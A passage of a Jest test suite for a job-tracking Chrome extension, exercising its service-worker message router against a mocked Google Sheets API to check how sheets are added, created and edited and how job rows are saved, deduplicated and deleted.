/**
 * End-to-end "add / save" flows driven through the REAL service-worker message
 * router (background/service-worker.js) with a mocked `chrome` global and a
 * mocked `fetch` that emulates Google Sheets faithfully enough to check data:
 * a real 2D grid per tab, chunked A1 range reads, values.update/append/clear,
 * batchUpdate (delete/move/insert/append dimension, rename, formatting), POST
 * create, spreadsheets.get with `fields`, drive.file 403/404, 429, 401,
 * protected ranges, offline, and the OAuth refresh endpoint.
 */
import { jest } from '@jest/globals';

const DRIVE = 'https://www.googleapis.com/auth/drive.file';
const PICKER_ORIGIN = 'https://jobtracker.jayshah.xyz';
const EXT_ID = 'abcdefghijklmnopabcdefghijklmnop';

// Published client => the website Picker is available (unless a custom client is stored).
jest.unstable_mockModule('../lib/oauth-config.js', () => ({
  DEFAULT_OAUTH_CLIENT_ID: 'published.apps.googleusercontent.com',
  DEFAULT_OAUTH_CLIENT_SECRET: 'published-secret',
  DRIVE_FILE_SCOPE: DRIVE,
  hasPublishedOAuthDefaults: () => true,
}));

// ---------------------------------------------------------------- fake Google

const colToNum = (s) => [...s].reduce((n, ch) => n * 26 + ch.charCodeAt(0) - 64, 0);
const quoteTab = (t) => (/^[A-Za-z0-9_]+$/.test(t) ? t : `'${t.replace(/'/g, "''")}'`);
const HYPERLINK_RE = /^\s*=\s*HYPERLINK\s*\(\s*"(?:[^"]|"")*"\s*,\s*"((?:[^"]|"")*)"\s*\)\s*$/i;

class ApiError extends Error {
  constructor(status, message) {
    super(message);
    this.status = status;
  }
}

class FakeGoogle {
  constructor() {
    this.reset();
  }

  reset() {
    delete this.route; // drop per-test overrides
    this.spreadsheets = new Map();
    this.validTokens = new Set(['tok-1']);
    this.offline = false;
    this.rateLimited = 0; // next N sheets requests return 429
    this.refreshFailure = null; // { status, body }
    this.refreshCount = 0;
    this.nextSheetId = 1000;
    this.nextSpreadsheet = 1;
    this.requests = [];
    this.formatCalls = 0;
  }

  /** tabs: [{ title, rows, sheetId?, rowCount?, colCount?, locked? }] */
  add(id, { title = 'Sheet', tabs, access = 'granted' } = {}) {
    const sheets = (tabs || [{ title: 'Sheet1', rows: [] }]).map((t, i) => ({
      sheetId: t.sheetId ?? (i === 0 ? 0 : this.nextSheetId++),
      title: t.title,
      index: i,
      grid: (t.rows || []).map((r) => [...r]),
      rowCount: t.rowCount ?? 1000,
      colCount: t.colCount ?? 26,
      locked: Boolean(t.locked),
    }));
    this.spreadsheets.set(id, { id, title, sheets, access });
    return this.spreadsheets.get(id);
  }

  tab(id, title) {
    return this.spreadsheets.get(id).sheets.find((s) => s.title === title);
  }

  /** Grid as the user would see it (trailing empties trimmed). */
  cells(id, title) {
    const t = this.tab(id, title);
    return t.grid.map((r) => this.trimRow(r));
  }

  trimRow(row) {
    const out = [...row].map((c) => (c == null ? '' : c));
    while (out.length && out[out.length - 1] === '') out.pop();
    return out;
  }

  // ---- fetch entry point
  fetch = async (url, options = {}) => {
    const method = (options.method || 'GET').toUpperCase();
    this.requests.push({ url: String(url), method });
    if (this.offline) throw new TypeError('Failed to fetch');
    try {
      const body = await this.route(String(url), method, options);
      return { ok: true, status: 200, json: async () => body };
    } catch (err) {
      if (!(err instanceof ApiError)) throw err;
      return {
        ok: false,
        status: err.status,
        json: async () => ({ error: { code: err.status, message: err.message } }),
      };
    }
  };

  async route(url, method, options) {
    if (url.startsWith('https://oauth2.googleapis.com/token')) return this.token(options);
    const prefix = 'https://sheets.googleapis.com/v4/spreadsheets';
    if (!url.startsWith(prefix)) throw new Error(`Unexpected URL ${url}`);

    const auth = options.headers?.Authorization || '';
    if (!this.validTokens.has(auth.replace('Bearer ', ''))) {
      throw new ApiError(401, 'Request had invalid authentication credentials.');
    }
    if (this.rateLimited > 0) {
      this.rateLimited -= 1;
      throw new ApiError(429, 'Quota exceeded for quota metric');
    }

    const [path, query = ''] = url.slice(prefix.length).split('?');
    const params = new URLSearchParams(query);
    const payload = options.body ? JSON.parse(options.body) : {};

    if (path === '' && method === 'POST') return this.create(payload);

    let m = path.match(/^\/([^/:]+):batchUpdate$/);
    if (m) return this.batchUpdate(this.open(m[1]), payload.requests || []);

    m = path.match(/^\/([^/:]+)\/values\/(.+?)(:append|:clear)?$/);
    if (m) {
      const sp = this.open(m[1]);
      const range = this.parseRange(sp, decodeURIComponent(m[2]));
      if (m[3] === ':append') return this.append(sp, range, payload.values, params);
      if (m[3] === ':clear') return this.clear(sp, range);
      if (method === 'PUT') return this.update(sp, range, payload.values);
      return this.getValues(sp, range, params.get('valueRenderOption') || 'FORMATTED_VALUE');
    }

    m = path.match(/^\/([^/:]+)$/);
    if (m && method === 'GET') return this.getSpreadsheet(this.open(m[1]), params.get('fields') || '');
    throw new Error(`Unhandled ${method} ${url}`);
  }

  token(options) {
    const body = new URLSearchParams(String(options.body));
    if (body.get('grant_type') !== 'refresh_token') throw new Error('unexpected grant');
    this.refreshCount += 1;
    if (this.refreshFailure) {
      throw new TokenFailure(this.refreshFailure);
    }
    const access = `tok-refreshed-${this.refreshCount}`;
    this.validTokens.add(access);
    return { access_token: access, expires_in: 3600, scope: DRIVE };
  }

  open(id) {
    const sp = this.spreadsheets.get(id);
    // drive.file: files the app has no grant for look like 404 (or 403).
    if (!sp || sp.access === 'notfound') throw new ApiError(404, 'Requested entity was not found.');
    if (sp.access === 'forbidden') {
      throw new ApiError(403, 'The caller does not have permission');
    }
    return sp;
  }

  create(payload) {
    const id = `NewSheetId${String(this.nextSpreadsheet++).padStart(12, '0')}`;
    const title = payload.properties?.title || 'Untitled spreadsheet';
    const tabs = (payload.sheets || [{ properties: { title: 'Sheet1' } }]).map((s) => ({
      title: s.properties.title,
      sheetId: this.nextSheetId++,
      rows: [],
    }));
    const sp = this.add(id, { title, tabs });
    return {
      spreadsheetId: id,
      spreadsheetUrl: `https://docs.google.com/spreadsheets/d/${id}/edit`,
      properties: { title },
      sheets: sp.sheets.map((s) => ({ properties: { sheetId: s.sheetId, title: s.title } })),
    };
  }

  getSpreadsheet(sp, fields) {
    const out = {};
    if (!fields || fields.includes('properties(title)')) out.properties = { title: sp.title };
    out.sheets = sp.sheets.map((s) => {
      const properties = { sheetId: s.sheetId, title: s.title, index: s.index };
      if (fields.includes('gridProperties')) {
        properties.gridProperties = { rowCount: s.rowCount, columnCount: s.colCount };
      }
      return { properties };
    });
    return out;
  }

  parseRange(sp, a1) {
    const m = a1.match(
      /^(?:'((?:[^']|'')*)'|([^!']+))!([A-Z]+)(\d*)(?::([A-Z]+)(\d*))?$/
    );
    if (!m) throw new ApiError(400, `Unable to parse range: ${a1}`);
    const title = m[1] != null ? m[1].replace(/''/g, "'") : m[2];
    const tab = sp.sheets.find((s) => s.title === title);
    if (!tab) throw new ApiError(400, `Unable to parse range: ${a1}`);
    const c1 = colToNum(m[3]);
    const c2 = m[5] ? colToNum(m[5]) : c1;
    const r1 = m[4] ? Number(m[4]) : 1;
    const r2 = m[6] ? Number(m[6]) : m[5] && !m[4] ? tab.rowCount : m[4] ? r1 : tab.rowCount;
    return { tab, c1, c2, r1, r2 };
  }

  checkWritable(tab) {
    if (tab.locked) {
      throw new ApiError(403, 'You are trying to edit a protected cell or object.');
    }
  }

  getValues(sp, { tab, c1, c2, r1, r2 }, render) {
    if (r1 > tab.rowCount) {
      throw new ApiError(400, `Range ('${tab.title}'!A${r1}) exceeds grid limits. Max rows: ${tab.rowCount}`);
    }
    const last = Math.min(r2, tab.rowCount);
    const values = [];
    for (let r = r1; r <= last; r++) {
      const raw = (tab.grid[r - 1] || []).slice(c1 - 1, c2);
      const shown = raw.map((c) => {
        if (c == null) return '';
        const link = typeof c === 'string' ? c.match(HYPERLINK_RE) : null;
        return render === 'FORMULA' || !link ? c : link[1].replace(/""/g, '"');
      });
      values.push(this.trimRow(shown));
    }
    while (values.length && values[values.length - 1].length === 0) values.pop();
    return values.length ? { range: `${quoteTab(tab.title)}!A1`, majorDimension: 'ROWS', values } : { range: `${quoteTab(tab.title)}!A1`, majorDimension: 'ROWS' };
  }

  update(sp, { tab, c1, r1 }, values) {
    this.checkWritable(tab);
    const rows = values || [];
    const width = Math.max(0, ...rows.map((r) => r.length));
    if (r1 + rows.length - 1 > tab.rowCount || c1 + width - 1 > tab.colCount) {
      throw new ApiError(
        400,
        `Range exceeds grid limits. Max rows: ${tab.rowCount}, max columns: ${tab.colCount}`
      );
    }
    rows.forEach((row, i) => {
      const target = (tab.grid[r1 - 1 + i] ||= []);
      row.forEach((v, j) => {
        target[c1 - 1 + j] = v;
      });
      for (let k = 0; k < target.length; k++) if (target[k] === undefined) target[k] = '';
    });
    const endCol = c1 + width - 1;
    return {
      updatedRange: `${quoteTab(tab.title)}!${numToCol(c1)}${r1}:${numToCol(endCol)}${r1 + rows.length - 1}`,
      updatedRows: rows.length,
      updatedColumns: width,
    };
  }

  append(sp, { tab }, values) {
    this.checkWritable(tab);
    let last = 0;
    tab.grid.forEach((r, i) => {
      if (r && r.some((c) => c !== '' && c != null)) last = i + 1;
    });
    const row = values[0];
    const rowNumber = last + 1;
    if (rowNumber > tab.rowCount) tab.rowCount = rowNumber;
    for (let i = tab.grid.length; i < rowNumber - 1; i++) tab.grid[i] = [];
    tab.grid[rowNumber - 1] = [...row];
    if (row.length > tab.colCount) tab.colCount = row.length;
    return {
      spreadsheetId: sp.id,
      tableRange: `${quoteTab(tab.title)}!A1:${numToCol(row.length)}${last || 1}`,
      updates: {
        updatedRange: `${quoteTab(tab.title)}!A${rowNumber}:${numToCol(row.length)}${rowNumber}`,
        updatedRows: 1,
        updatedColumns: row.length,
        updatedCells: row.length,
      },
    };
  }

  clear(sp, { tab, c1, c2, r1, r2 }) {
    this.checkWritable(tab);
    for (let r = r1; r <= Math.min(r2, tab.grid.length); r++) {
      const row = tab.grid[r - 1];
      if (!row) continue;
      for (let c = c1; c <= Math.min(c2, row.length); c++) row[c - 1] = '';
    }
    return { clearedRange: `${quoteTab(tab.title)}!A${r1}` };
  }

  batchUpdate(sp, requests) {
    for (const req of requests) {
      if (req.repeatCell) {
        this.formatCalls += 1;
        this.sheetById(sp, req.repeatCell.range.sheetId);
      } else if (req.updateSheetProperties) {
        const p = req.updateSheetProperties.properties;
        const tab = this.sheetById(sp, p.sheetId);
        this.checkWritable(tab);
        if (sp.sheets.some((s) => s !== tab && s.title.toLowerCase() === p.title.toLowerCase())) {
          throw new ApiError(400, 'A sheet with the name already exists.');
        }
        tab.title = p.title;
      } else if (req.deleteDimension) {
        const { range } = req.deleteDimension;
        const tab = this.sheetById(sp, range.sheetId);
        this.checkWritable(tab);
        if (range.dimension === 'ROWS') {
          tab.grid.splice(range.startIndex, range.endIndex - range.startIndex);
          tab.rowCount -= range.endIndex - range.startIndex;
        } else {
          if (range.endIndex > tab.colCount) throw new ApiError(400, 'Invalid dimension range');
          if (tab.colCount - (range.endIndex - range.startIndex) < 1) {
            throw new ApiError(400, 'You cannot delete all non-frozen columns.');
          }
          tab.grid.forEach((r) => r && r.splice(range.startIndex, range.endIndex - range.startIndex));
          tab.colCount -= range.endIndex - range.startIndex;
        }
      } else if (req.moveDimension) {
        const { source, destinationIndex } = req.moveDimension;
        const tab = this.sheetById(sp, source.sheetId);
        this.checkWritable(tab);
        if (source.dimension !== 'COLUMNS') throw new Error('only column moves emulated');
        const from = source.startIndex;
        const to = destinationIndex > from ? destinationIndex - 1 : destinationIndex;
        for (const r of tab.grid) {
          if (!r) continue;
          while (r.length < tab.colCount) r.push('');
          const [v] = r.splice(from, 1);
          r.splice(to, 0, v);
        }
      } else if (req.insertDimension) {
        const { range } = req.insertDimension;
        const tab = this.sheetById(sp, range.sheetId);
        this.checkWritable(tab);
        tab.grid.forEach((r) => r && r.length > range.startIndex && r.splice(range.startIndex, 0, ''));
        tab.colCount += 1;
      } else if (req.appendDimension) {
        const { sheetId, length } = req.appendDimension;
        const tab = this.sheetById(sp, sheetId);
        tab.colCount += length;
      } else {
        throw new Error(`Unhandled batch request ${Object.keys(req)}`);
      }
    }
    return { spreadsheetId: sp.id, replies: requests.map(() => ({})) };
  }

  sheetById(sp, sheetId) {
    const tab = sp.sheets.find((s) => s.sheetId === sheetId);
    if (!tab) throw new ApiError(400, 'No grid with id: ' + sheetId);
    return tab;
  }
}

class TokenFailure extends Error {
  constructor({ status, body }) {
    super('token failure');
    this.status = status;
    this.body = body;
  }
}

function numToCol(n) {
  let s = '';
  while (n > 0) {
    s = String.fromCharCode(65 + ((n - 1) % 26)) + s;
    n = Math.floor((n - 1) / 26);
  }
  return s;
}

// ------------------------------------------------------------------- harness

const google = new FakeGoogle();
const store = {};
let onMessage;
let onExternal;
let createdTabs;
let broadcasts;

// Wrap fetch so token-endpoint failures keep a realistic Response shape.
async function fakeFetch(url, options) {
  try {
    return await google.fetch(url, options);
  } catch (err) {
    if (err instanceof TokenFailure) {
      return { ok: false, status: err.status, json: async () => err.body };
    }
    throw err;
  }
}

function installChrome() {
  const noopEvent = () => ({ addListener: () => {} });
  global.chrome = {
    runtime: {
      id: EXT_ID,
      lastError: undefined,
      onMessage: { addListener: (fn) => (onMessage = fn) },
      onMessageExternal: { addListener: (fn) => (onExternal = fn) },
      onInstalled: noopEvent(),
      onStartup: noopEvent(),
      sendMessage: (msg) => {
        broadcasts.push(msg);
        return Promise.resolve();
      },
      getURL: (p) => `chrome-extension://${EXT_ID}/${p}`,
    },
    storage: {
      local: {
        get: async (keys) => {
          const list = Array.isArray(keys) ? keys : [keys];
          const out = {};
          for (const k of list) if (k in store) out[k] = structuredClone(store[k]);
          return out;
        },
        set: async (data) => {
          Object.assign(store, structuredClone(data));
        },
        remove: async (k) => {
          for (const key of Array.isArray(k) ? k : [k]) delete store[key];
        },
      },
    },
    tabs: {
      create: async (opts) => {
        createdTabs.push(opts);
        return { id: 1 };
      },
      onRemoved: noopEvent(),
      onUpdated: noopEvent(),
      sendMessage: async () => {},
    },
    action: { onClicked: noopEvent() },
    sidePanel: { setOptions: async () => {}, setPanelBehavior: async () => {} },
    identity: { getRedirectURL: () => `https://${EXT_ID}.chromiumapp.org/` },
  };
}

/** Send a message through the real router; resolves to the response. */
function send(message, sender = {}) {
  return new Promise((resolve) => {
    onMessage(message, sender, resolve);
  });
}

function sendExternal(message, sender) {
  return new Promise((resolve) => {
    onExternal(message, sender, resolve);
  });
}

const pickerSender = {
  origin: PICKER_ORIGIN,
  url: `${PICKER_ORIGIN}/picker/?ext=${EXT_ID}`,
};

function signIn(overrides = {}) {
  store.googleToken = {
    accessToken: 'tok-1',
    refreshToken: 'rt-1',
    expiresAt: Date.now() + 3600_000,
    scope: DRIVE,
    ...overrides,
  };
}

const sid = (n) => `1AbCdEfGhIjKlMnOpQrSt${String(n).padStart(3, '0')}`;
const editUrl = (id, tail = '/edit') => `https://docs.google.com/spreadsheets/d/${id}${tail}`;

const DEFAULTS = ['Date Applied', 'Job ID', 'Company Name', 'Role', 'Location', 'Application Status', 'Notes'];

const JOB = {
  company: 'Acme Corp',
  role: 'Software Engineer',
  location: 'Remote',
  url: 'https://boards.greenhouse.io/acme/jobs/12345?gh_jid=12345',
  jobId: '12345',
};
const JOB2 = {
  company: 'Globex',
  role: 'Data Analyst',
  location: 'NYC',
  url: 'https://jobs.lever.co/globex/9f8e7d6c-aaaa-bbbb-cccc-111122223333',
};

beforeAll(async () => {
  installChrome();
  global.fetch = fakeFetch;
  await import('../background/service-worker.js');
});

beforeEach(() => {
  for (const k of Object.keys(store)) delete store[k];
  google.reset();
  createdTabs = [];
  broadcasts = [];
  store.configuredSheets = [];
  signIn();
  jest.spyOn(console, 'error').mockImplementation(() => {});
  jest.spyOn(console, 'warn').mockImplementation(() => {});
});

afterEach(() => {
  jest.restoreAllMocks();
});

const getSheets = async () => (await send({ type: 'GET_SHEETS' })).sheets;

// ------------------------------------------------------------------ ADD_SHEET

describe('ADD_SHEET', () => {
  test.each([
    ['edit with #gid', (id) => editUrl(id, '/edit#gid=0')],
    ['bare /d/<id>', (id) => editUrl(id, '')],
    ['/edit?gid=', (id) => editUrl(id, '/edit?gid=0')],
    ['trailing params', (id) => editUrl(id, '/edit?usp=sharing&gid=0#gid=0')],
    ['surrounding whitespace', (id) => `  ${editUrl(id)}  `],
    ['with account index', (id) => `https://docs.google.com/spreadsheets/u/1/d/${id}/edit`],
  ])('accepts URL form: %s', async (_name, build) => {
    const id = sid(1);
    google.add(id, { title: 'My Jobs', tabs: [{ title: 'Sheet1', rows: [] }] });
    const res = await send({ type: 'ADD_SHEET', url: build(id) });
    expect(res.success).toBe(true);
    expect(res.sheet.spreadsheetId).toBe(id);
    expect(res.sheet.name).toBe('My Jobs');
    expect((await getSheets()).map((s) => s.spreadsheetId)).toEqual([id]);
  });

  test.each([
    ['empty', ''],
    ['undefined', undefined],
    ['whitespace', '   '],
    ['non-sheets url', 'https://example.com/spreadsheets/d/abc'],
    ['docs document', 'https://docs.google.com/document/d/abcdefghijklmnopqrstuvwx/edit'],
    ['garbage', 'not a url'],
    ['sheets with no id', 'https://docs.google.com/spreadsheets/d/'],
  ])('rejects invalid input: %s', async (_name, url) => {
    const res = await send({ type: 'ADD_SHEET', url });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/Google Sheets/);
    expect(google.requests).toHaveLength(0);
    expect(await getSheets()).toEqual([]);
  });

  test('seeds an empty tab with default headers and bold header formatting', async () => {
    const id = sid(2);
    google.add(id, { tabs: [{ title: 'Sheet1', rows: [] }] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(google.cells(id, 'Sheet1')).toEqual([DEFAULTS]);
    const tab = res.sheet.tabs[0];
    expect(tab.headers).toEqual(DEFAULTS);
    expect(tab.isNew).toBe(false);
    expect(tab.rowCount).toBe(1);
    expect(google.formatCalls).toBeGreaterThan(0);
    expect(tab.mappings.map((m) => m.tag)).toEqual([
      'date_applied',
      'id',
      'company_name',
      'role',
      'location',
      'custom_dropdown',
      'custom_textbox',
    ]);
  });

  test('multi-tab sheet: seeds only EMPTY tabs and never overwrites populated headers', async () => {
    const id = sid(3);
    const populated = [
      ['Company', 'Title', 'Stage', 'Salary'],
      ['Initech', 'Engineer', 'Applied', '100000'],
    ];
    const headerOnly = [['Employer', 'Position']];
    google.add(id, {
      tabs: [
        { title: 'Empty', rows: [] },
        { title: 'Populated', rows: populated },
        { title: 'Header only', rows: headerOnly },
        { title: 'Blank first row', rows: [[], ['x', 'y']] },
      ],
    });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(google.cells(id, 'Empty')).toEqual([DEFAULTS]);
    expect(google.cells(id, 'Populated')).toEqual(populated);
    expect(google.cells(id, 'Header only')).toEqual(headerOnly);
    const byName = Object.fromEntries(res.sheet.tabs.map((t) => [t.tabName, t]));
    expect(byName.Populated.headers).toEqual(['Company', 'Title', 'Stage', 'Salary']);
    expect(byName.Populated.rowCount).toBe(2);
    expect(byName['Header only'].headers).toEqual(['Employer', 'Position']);
  });

  test('existing headers are detected and mapped to field tags', async () => {
    const id = sid(4);
    google.add(id, {
      tabs: [
        {
          title: 'Apps',
          rows: [
            ['Company', 'Job Title', 'Link', 'City', 'Status', 'Posted Date', 'Misc'],
            ['Initech', 'Dev', 'https://x.com/1', 'Austin', 'Offer', '2024-01-02', 'hi'],
          ],
        },
      ],
    });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    const tags = res.sheet.tabs[0].mappings.map((m) => m.tag);
    expect(tags.slice(0, 6)).toEqual([
      'company_name',
      'role',
      'url',
      'location',
      'custom_dropdown',
      'job_posted_date',
    ]);
    const status = res.sheet.tabs[0].mappings[4];
    expect(status.dropdownOptions).toEqual(expect.arrayContaining(['Offer']));
    expect(google.cells(id, 'Apps')).toHaveLength(2);
  });

  test.each([403, 404])('%i from Google => needsPicker when the Picker is available', async (status) => {
    const id = sid(5);
    google.add(id, { access: status === 403 ? 'forbidden' : 'notfound' });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res).toMatchObject({ success: false, needsPicker: true, spreadsheetId: id });
    expect(res.error).toMatch(/choose the spreadsheet with Google/);
    expect(await getSheets()).toEqual([]);
  });

  test('a spreadsheet id that does not exist behaves like not granted', async () => {
    const res = await send({ type: 'ADD_SHEET', url: editUrl(sid(99)) });
    expect(res.needsPicker).toBe(true);
  });

  test('custom client: no-access is a plain error, not needsPicker', async () => {
    store.oauthClientId = 'mine.apps.googleusercontent.com';
    const id = sid(6);
    google.add(id, { access: 'forbidden' });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.needsPicker).toBeUndefined();
    expect(res.error).toMatch(/Create tracker sheet/);
  });

  test('re-adding an already-added sheet keeps one entry and never reseeds data', async () => {
    const id = sid(7);
    google.add(id, { tabs: [{ title: 'Sheet1', rows: [] }] });
    await send({ type: 'ADD_SHEET', url: editUrl(id) });
    await send({
      type: 'SAVE_JOB',
      spreadsheetId: id,
      tabId: '0',
      extractedData: JOB,
      userInputs: {},
    });
    const before = structuredClone(google.cells(id, 'Sheet1'));
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(await getSheets()).toHaveLength(1);
    expect(google.cells(id, 'Sheet1')).toEqual(before);
    expect(res.sheet.tabs[0].rowCount).toBe(2);
  });

  test('signed out => friendly sign-in error, nothing stored', async () => {
    delete store.googleToken;
    const id = sid(8);
    google.add(id);
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/Sign in with Google/);
  });

  test('offline => connection error and no seeding/config', async () => {
    const id = sid(9);
    google.add(id);
    google.offline = true;
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/internet connection/);
    expect(await getSheets()).toEqual([]);
  });

  test('429 => rate limit message, sheet not added', async () => {
    const id = sid(10);
    google.add(id);
    google.rateLimited = 1;
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/limiting requests/);
    expect(await getSheets()).toEqual([]);
  });

  test('a failed row read must never seed headers over a populated sheet', async () => {
    const id = sid(11);
    const rows = [['Company', 'Role'], ['A', 'B']];
    google.add(id, { tabs: [{ title: 'Real', rows }] });
    const realRoute = google.route.bind(google);
    google.route = async (url, ...rest) => {
      if (url.includes('/values/')) throw new ApiError(500, 'backend error');
      return realRoute(url, ...rest);
    };
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(google.cells(id, 'Real')).toEqual(rows);
  });

  test('protected (locked) empty tab: seeding fails cleanly, no config saved', async () => {
    const id = sid(12);
    google.add(id, { tabs: [{ title: 'Locked', rows: [], locked: true }] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toBeTruthy();
    expect(await getSheets()).toEqual([]);
  });

  test('empty spreadsheet with zero tabs does not crash', async () => {
    const id = sid(13);
    google.add(id, { tabs: [] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(res.sheet.tabs).toEqual([]);
  });
});

// -------------------------------------------------------------- A1 / names

describe('tab and sheet names in A1 ranges', () => {
  const names = ["Bob's Jobs", 'Jobs 2024', 'Ünïcödé 求職', "It''s", 'A!B', 'a:b', 'Applications (copy)', '日本語', "'quoted'"];

  test.each(names)('add + save + find + update + delete on tab %j', async (tabName) => {
    const id = sid(20);
    google.add(id, { title: "Jay's \"Jobs\" 求職", tabs: [{ title: tabName, rows: [], sheetId: 77 }] });
    const added = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(added.error).toBeUndefined();
    expect(added.sheet.name).toBe("Jay's \"Jobs\" 求職");
    expect(google.cells(id, tabName)).toEqual([DEFAULTS]);

    const saved = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId: '77', extractedData: JOB, userInputs: {} });
    expect(saved.success).toBe(true);
    expect(saved.rowIndex).toBe(1);
    expect(google.cells(id, tabName)).toHaveLength(2);

    const found = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    expect(found).toMatchObject({ success: true, matched: true, rowIndex: 1, tabName });

    const upd = await send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId: '77', extractedData: JOB,
      userInputs: { text_6: 'note' }, existingRowIndex: 1,
    });
    expect(upd.success).toBe(true);
    expect(google.cells(id, tabName)[1][6]).toBe('note');

    const del = await send({ type: 'DELETE_JOB', spreadsheetId: id, tabId: '77', rowIndex: 1 });
    expect(del.success).toBe(true);
    expect(google.cells(id, tabName)).toEqual([DEFAULTS]);
  });

  test('a wide sheet (30 columns) is read past column Z', async () => {
    const id = sid(21);
    const headers = Array.from({ length: 30 }, (_, i) => `Col ${i + 1}`);
    google.add(id, { tabs: [{ title: 'Wide', rows: [headers], colCount: 30 }] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.sheet.tabs[0].headers).toHaveLength(30);
    expect(res.sheet.tabs[0].headers[29]).toBe('Col 30');
  });

  test('a long sheet (1,200 rows, chunked reads) is read completely and dedupes on the last row', async () => {
    const id = sid(22);
    const rows = [DEFAULTS];
    for (let i = 1; i <= 1199; i++) rows.push(['2024-01-01', `id${i}`, `Co ${i}`, `Role ${i}`, 'X', 'Applied', '']);
    rows.push(['2024-01-01', '12345', 'Acme Corp', 'Software Engineer', 'Remote', 'Applied', '']);
    google.add(id, { tabs: [{ title: 'Big', rows, rowCount: 2000 }] });
    const added = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(added.sheet.tabs[0].rowCount).toBe(1201);
    const dup = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId: '0', extractedData: JOB, userInputs: {} });
    expect(dup.alreadyApplied).toBe(true);
    const chunkReads = google.requests.filter((r) => r.url.includes('/values/') && r.method === 'GET');
    expect(chunkReads.length).toBeGreaterThanOrEqual(3);
  });

  test('a sheet whose row count is an exact multiple of the chunk size is read fully', async () => {
    const id = sid(23);
    const rows = [DEFAULTS];
    for (let i = 1; i < 500; i++) rows.push(['2024-01-01', `id${i}`, `Co ${i}`, `R${i}`, '', 'Applied', '']);
    google.add(id, { tabs: [{ title: 'Exact', rows, rowCount: 500 }] });
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(true);
    expect(res.sheet.tabs[0].rowCount).toBe(500);
  });
});

// --------------------------------------------------------------- CREATE_SHEET

describe('CREATE_SHEET -> SAVE_JOB -> FIND -> duplicate', () => {
  test('default title, Applications tab, headers seeded, listed in GET_SHEETS', async () => {
    const res = await send({ type: 'CREATE_SHEET' });
    expect(res.success).toBe(true);
    expect(res.sheet.name).toBe('Job Tracker');
    expect(res.spreadsheetUrl).toMatch(/^https:\/\/docs\.google\.com\/spreadsheets\/d\//);
    const tab = res.sheet.tabs[0];
    expect(tab.tabName).toBe('Applications');
    expect(tab.gid).toBe(String(tab.sheetId));
    expect(Number(tab.gid)).not.toBe(0); // created sheets have non-zero gids
    expect(google.cells(res.sheet.spreadsheetId, 'Applications')).toEqual([DEFAULTS]);
    expect((await getSheets()).map((s) => s.spreadsheetId)).toEqual([res.sheet.spreadsheetId]);
  });

  test('custom title (trimmed) and blank title fallback', async () => {
    const a = await send({ type: 'CREATE_SHEET', title: '  2025 求職 "Hunt"  ' });
    expect(a.sheet.name).toBe('2025 求職 "Hunt"');
    const b = await send({ type: 'CREATE_SHEET', title: '   ' });
    expect(b.sheet.name).toBe('Job Tracker');
    expect(await getSheets()).toHaveLength(2);
  });

  test('works with a custom client too (create needs no Picker)', async () => {
    store.oauthClientId = 'mine.apps.googleusercontent.com';
    const res = await send({ type: 'CREATE_SHEET' });
    expect(res.success).toBe(true);
  });

  test('full lifecycle: save, content, find, duplicate rejection, update, delete', async () => {
    const created = await send({ type: 'CREATE_SHEET', title: 'Lifecycle' });
    const id = created.sheet.spreadsheetId;
    const tabId = created.sheet.tabs[0].gid;

    const saved = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {} });
    expect(saved.success).toBe(true);
    expect(saved.rowIndex).toBe(1);
    expect(saved).toMatchObject({ tabName: 'Applications', sheetName: 'Lifecycle' });

    const grid = google.cells(id, 'Applications');
    expect(grid).toHaveLength(2);
    const [date, jobId, company, role, location, status] = grid[1];
    expect(date).toMatch(/^\d{4}-\d{2}-\d{2}$/);
    expect(jobId).toBe('12345');
    expect(company).toBe('Acme Corp');
    expect(role).toBe(`=HYPERLINK("${JOB.url}","Software Engineer")`);
    expect(location).toBe('Remote');
    expect(['Applied', 'Not Applied']).toContain(status);
    // Header row untouched and stays aligned with the data columns.
    expect(grid[0]).toEqual(DEFAULTS);

    const stored = (await getSheets())[0].tabs[0];
    expect(stored.rowCount).toBe(2);

    const found = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    expect(found).toMatchObject({
      success: true,
      matched: true,
      matchedBy: 'url',
      rowIndex: 1,
      spreadsheetId: id,
      gid: tabId,
      company: 'Acme Corp',
      role: 'Software Engineer',
      jobId: '12345',
    });
    expect((await send({ type: 'FIND_APPLICATION', extractedData: JOB2 })).matched).toBe(false);

    const dup = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB, userInputs: {} });
    expect(dup).toMatchObject({ success: false, alreadyApplied: true });
    expect(google.cells(id, 'Applications')).toHaveLength(2);

    // A second, different job lands on the next row.
    const second = await send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB2, userInputs: {} });
    expect(second.rowIndex).toBe(2);

    // Update the first job's status in place; other rows untouched.
    const upd = await send({
